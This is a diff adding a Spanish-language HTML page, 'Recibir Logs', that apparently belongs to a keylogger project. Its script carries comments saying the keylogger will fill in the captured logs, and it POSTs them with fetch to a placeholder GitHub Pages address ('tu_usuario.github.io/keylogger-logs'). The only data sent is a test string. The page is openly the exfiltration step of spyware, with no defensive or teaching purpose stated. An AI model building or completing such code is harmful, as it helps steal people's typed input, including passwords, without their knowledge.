@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recibir Logs</title>
+</head>
+<body>
+    <h1>Recibir Logs</h1>
+    <form id="logForm">
+        <input type="hidden" id="logs" name="logs">
+        <button type="submit">Enviar Logs</button>
+    </form>
+
+    <script>
+        // Simular el envío de logs (esto lo hará el keylogger)
+        document.getElementById("logForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const logs = "prueba de logs";  // Esto lo reemplazará el keylogger
+            document.getElementById("logs").value = logs;
+
+            // Enviar el formulario
+            fetch("https://tu_usuario.github.io/keylogger-logs", {
+                method: "POST",
+                body: new FormData(document.getElementById("logForm")),
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
+        });
+    </script>
+</body>
+</html>
